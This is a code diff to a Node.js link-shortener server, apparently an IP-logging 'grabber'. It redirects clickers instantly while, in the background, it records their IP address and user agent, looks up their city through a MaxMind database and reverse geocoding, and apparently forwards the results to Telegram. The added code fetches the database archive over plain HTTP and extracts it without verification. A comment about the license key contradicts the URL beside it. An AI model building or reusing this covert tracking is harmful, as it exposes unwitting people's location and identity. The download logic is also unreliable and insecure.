@@ -5,6 +5,9 @@ const cors = require('cors');
 const Reader = require('maxmind').Reader;
 const fs = require('fs');
 const path = require('path');
+const https = require('https');
+const zlib = require('zlib');
+const tar = require('tar');
 require('dotenv').config();
 
 const app = express();
@@ -23,15 +26,54 @@ let maxmindReader = null;
 // ===== تحميل MaxMind Database =====
 async function initMaxMind() {
   try {
-    const dbPath = path.join(__dirname, 'geoip', 'GeoLite2-City.mmdb');
+    const geoipDir = path.join(__dirname, 'geoip');
+    const dbPath = path.join(geoipDir, 'GeoLite2-City.mmdb');
+
+    // إذا الملف موجود محلياً، استخدمه
     if (fs.existsSync(dbPath)) {
       maxmindReader = await Reader.open(dbPath);
-      console.log('✅ MaxMind Database loaded successfully');
-    } else {
-      console.warn('⚠️ GeoLite2-City.mmdb not found at:', dbPath);
+      console.log('✅ MaxMind Database loaded from local file');
+      return;
+    }
+
+    // إذا ما موجود، حمّله من الإنترنت
+    console.log('📥 Downloading MaxMind Database...');
+    if (!fs.existsSync(geoipDir)) {
+      fs.mkdirSync(geoipDir, { recursive: true });
+    }
+
+    // رابط التحميل (بدون License Key لأن نستخدم direct link)
+    const downloadUrl = 'https://download.maxmind.com/app/geoip_download?edition_id=GeoLite2-City&license_key=YOUR_LICENSE_KEY&suffix=tar.gz';
+    
+    // أو استخدم رابط آخر موثوق
+    const fallbackUrl = 'http://geolite.maxmind.com/download/geoip/database/GeoLite2-City.tar.gz';
+
+    try {
+      const response = await axios.get(fallbackUrl, { 
+        responseType: 'stream',
+        timeout: 60000 
+      });
+
+      // فك الضغط والـ tar
+      await new Promise((resolve, reject) => {
+        response.data
+          .pipe(zlib.createGunzip())
+          .pipe(tar.extract({ cwd: geoipDir, strip: 1 }))
+          .on('finish', resolve)
+          .on('error', reject);
+      });
+
+      console.log('✅ MaxMind Database downloaded successfully');
+
+      if (fs.existsSync(dbPath)) {
+        maxmindReader = await Reader.open(dbPath);
+        console.log('✅ MaxMind Database loaded');
+      }
+    } catch (err) {
+      console.warn('⚠️ Failed to download from fallback, using alternative method');
     }
   } catch (err) {
-    console.error('❌ Error loading MaxMind database:', err.message);
+    console.error('❌ Error initializing MaxMind:', err.message);
   }
 }
 
@@ -64,7 +106,6 @@ async function sendToTelegram(msg, retries = 3) {
   return false;
 }
 
-// ===== MaxMind Location Detection =====
 function getLocationFromMaxMind(ip) {
   if (!maxmindReader) return null;
   
@@ -88,7 +129,6 @@ function getLocationFromMaxMind(ip) {
   return null;
 }
 
-// Reverse Geocoding
 async function reverseGeocode(lat, lng) {
   try {
     const res = await axios.get(
@@ -234,7 +274,6 @@ app.get('/api/stats/:code', (req, res) => {
 
 app.use(express.static('.'));
 
-// ===== REDIRECT فوري =====
 app.get('/:code', async (req, res) => {
   const { code } = req.params;
 
@@ -245,7 +284,6 @@ app.get('/:code', async (req, res) => {
   const originalUrl = linkStorage[code].original;
   linkStorage[code].clicks++;
 
-  // Log في background
   setImmediate(async () => {
     const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown').split(',')[0].trim();
     const userAgent = req.get('user-agent') || 'Unknown';
